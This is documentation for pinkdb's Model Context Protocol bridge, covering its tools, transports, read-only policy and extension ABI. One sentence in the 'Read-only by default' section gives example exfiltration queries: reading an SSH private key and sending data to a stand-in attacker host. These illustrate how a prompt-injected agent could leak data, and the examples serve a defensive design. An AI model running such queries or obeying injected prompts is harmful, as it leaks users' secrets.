Agents and MCP

pinkdb ships an extension that speaks the Model Context Protocol, so an agent — pi, Claude Code, fx, any MCP client — can query a store with the same compact Markdown results and JSON errors as the -agent CLI mode. pinkdb contains no model code: the client brings the reasoning, pinkdb runs the SQL.

To keep the reasoning inside pinkdb instead, use the pinkdb agent: the same tools, run by pinkdb itself, with the session, its checkpoints and its token usage stored in the database.

Quick start

# build the bridge next to the CLI
cargo build --release -p pinkdb-cli -p pinkdb-mcp

# one flag: open a store and serve one MCP client over stdio (read-only)
./target/release/pinkdb --mcp sales.pink

# or load it in an interactive session
./target/release/pinkdb sales.pink
pinkdb> LOAD EXTENSION './target/release/libpinkdb_mcp.dylib';
pinkdb> .mcp serve stdio              # one client on this terminal's pipes
pinkdb> .mcp serve http 7801          # streamable HTTP on 127.0.0.1:7801
pinkdb> .mcp serve stdio allow-writes # let the client change the store

--mcp looks for libpinkdb_mcp next to the pinkdb executable (or the install directory); pass --mcp-extension PATH to point at another build.

Transports

  • stdio — the default, and what a client's command/args config uses.
  • streamable HTTP — .mcp serve http PORT binds 127.0.0.1:PORT only. The extension refuses any other address before it starts: an MCP bridge runs the host's SQL under the host's identity, so it is not something to expose on a network interface.

Tools

Every tool has a precise JSON Schema and a one-line description written for a model deciding what to call next.

ToolArgumentWhat it returns
querysql One statement as compact Markdown: a table of at most 100 rows with the true row count, or a JSON error. The statement runs under the host's row, byte and time budget, and a truncated result ends with a … N more rows (M total) notice.
describetable Columns, types and nullability as DESCRIBE reports them.
tablesdatabase? Every table in the current (or named) database, SHOW TABLES.
databases— The databases in the session, SHOW DATABASES.
explainsql The plan, including the wave-99 cost hint (~N rows) so a model can tell a scan from a lookup.
lake_tablescatalog Tables in a lake catalog with their row counts.
lake_versionscatalog Snapshots: version, time, operation and row counts.
lake_changescatalog, table, from?, to? Inserted and deleted rows in a version range (default: the whole history).

The lake tools need a CLI build with the pinklake feature and work on a local catalog path or the pink:/sqlite:/postgres:// catalog URLs the lake layer accepts. They are read-only even in an allow-writes session: commit, merge and expire need a .pink store that no other session owns, so they stay CLI operations.

Read-only by default

The host — not the extension — decides what a statement may do. A read-only bridge refuses, with a one-line JSON error:

  • DML and DDL (INSERT, UPDATE, DELETE, CREATE, DROP, …);
  • COPY … TO, which writes files outside the store;
  • LOAD EXTENSION, which loads native code;
  • ATTACH … in a write mode;
  • lake commit and maintenance statements;
  • SET of security settings;
  • read_csv, read_parquet and bare paths in FROM, which read external files and URLs.

--allow-writes (.mcp serve … allow-writes) lifts the write policy, and every statement then still runs under the engine's grants, read-only transactions and the same limits.

Reading files and URLs is a separate switch, because a query alone can leak data: read_csv('/home/u/.ssh/id_rsa') or read_parquet('https://attacker.example/?d=…') in a SELECT is an exfiltration and SSRF channel once an injected prompt steers the model. The host binds the statement and refuses it with {"error":…,"kind":"permission"} unless the session was started with --mcp-allow-files (.mcp serve … allow-files); --allow-writes does not imply it. A bridge that serves a pinkdb-server store has no such policy check — the login's grants decide, and file scans are administrator-only there.

On a store with users, run the bridge under a login that may read: pinkdb-server --mcp-extension … requires --mcp-user NAME and PINKDB_MCP_PASSWORD on such a store and serves the server's own store over 127.0.0.1.

The extension ABI

Two additive capabilities make this possible without raw pointers crossing the boundary, and both are optional, so every ABI v1 extension loads unchanged:

  • A statement callback. The extension hands the host SQL text and receives text back — agent Markdown, or a JSON error. The host applies limits, grants and the read-only policy; no engine structure is shared.
  • A serve entry point (pinkdb_ext_serve). The host passes the API, a transport descriptor (stdio or http:HOST:PORT) and an options string, and gets control back when the client disconnects.

Both are detected by symbol presence. The ABI stays major version 1 (minor 4 now also carries the command entry point the pinkdb agent uses), so a v1 extension keeps loading unchanged. A library that is serving cannot be loaded again, and the loader's path rules still apply. The Rust SDK exposes HostSession and pinkdb_abi_exports_with_serve!; the C header and the language SDKs are regenerated with the next SDK release.

Connecting an agent

The bridge is a standard MCP server, so a client needs no adapter or package, only one line of configuration:

pi mcp add pinkdb -- pinkdb --mcp store.pink       # pi
claude mcp add pinkdb -- pinkdb --mcp store.pink   # Claude Code

A transcript

agent → query {"sql": "SELECT c.name, SUM(l.quantity * l.price) AS revenue
                      FROM lineitem l JOIN customers c ON c.id = l.customer_id
                      GROUP BY c.name ORDER BY revenue DESC LIMIT 3"}

| c.name:VARCHAR | revenue:BIGINT |
|---|---|
| Echo | 1000 |
| Acme | 400 |
| Cedar | 60 |

The model gets the same answer a person would, in the form a context window can afford — no JSON envelope per row, and an explicit count when the result had to be cut.
